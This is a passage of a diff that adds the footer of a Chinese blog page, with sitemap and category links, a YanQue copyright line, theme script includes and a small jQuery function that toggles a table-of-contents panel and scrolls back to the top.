+											<li><a href="/category/cao-zuo-xi-tong.html">操作系统</a></li>
+									</ul>
+								</section>
+							</div>
+
+							<div class="4u">
+								<section>
+									<header>
+										<h2>SITEMAP</h2>
+									</header>
+
+									<ul class="divided">
+												<li><a href="/authors.html">作者</a></li>
+												<li><a href="/categories.html">分类</a></li>
+												<li><a href="/archives.html">归档</a></li>
+												<li><a href="/tags.html">标签</a></li>
+									</ul>
+								</section>
+							</div>
+
+							<div class="4u">
+
+								<section>
+									<header>
+										<h2>Contact</h2>
+									</header>
+									<ul class="social">
+									</ul>
+								</section>
+							</div>
+						</div>
+						<div class="row">
+							<div class="12u">
+								<!-- Copyright -->
+									<div id="copyright">
+										<ul class="links">
+											<li>&copy; YanQue 2021-2024	</li>
+											<!-- <li>Images: <a href="http://facebook.com/DreametryDoodle">Dreametry Doodle</a> + <a href="http://iconify.it">Iconify.it</a></li>
+											<li>Design: <a href="http://html5up.net">HTML5 UP</a></li> -->
+										</ul>
+									</div>
+							</div>
+						</div>
+					</section>
+			</div>
+		<script src="/theme/js/jquery.min.js"></script>
+		<script src="/theme/js/jquery.dropotron.js"></script>
+		<script src="/theme/js/config.js"></script>
+		<script src="/theme/js/skel.min.js"></script>
+		<script src="/theme/js/skel-panels.min.js"></script>
+<script type="text/javascript">
+	function addEvent() {
+		$("#top-toc-tree-container > .toc-contents-title > h4").click(function() {
+			$("#top-toc-tree-container").toggleClass("no-active");
+			$("#sidebar-tools").toggleClass("no-active");
+		})
+		$("#sidebar-tools").click(function() {
+			$("#top-toc-tree-container").toggleClass("no-active");
+			$("#sidebar-tools").toggleClass("no-active");
+		})
+		$("#sidebar-tool-back-top").click(function() {
+			// window.scrollTo(0, 0);
+			window.scrollTo({
+				top: 0,
+				left: 0,
+				behavior: 'smooth' 
+			});
+		})
+	}
+	addEvent()
+</script>
+		<!--[if lte IE 8]><script src="js/html5shiv.js"></script><link rel="stylesheet" href="/theme/css/ie8.css" /><![endif]-->
+	</body>
+</html>
